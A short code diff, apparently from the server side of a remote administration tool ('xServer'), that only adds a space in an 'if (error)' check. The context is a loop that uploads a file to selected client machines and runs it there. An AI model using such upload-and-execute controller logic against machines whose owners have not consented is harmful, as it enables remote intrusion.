@@ -647,7 +647,7 @@ namespace xServer.Forms
                             foreach (Client c in GetSelectedClients())
                             {
                                 if (c == null) continue;
-                                if(error) continue;
+                                if (error) continue;
 
                                 FileSplit srcFile = new FileSplit(UploadAndExecute.FilePath);
                                 if (srcFile.MaxBlocks < 0)
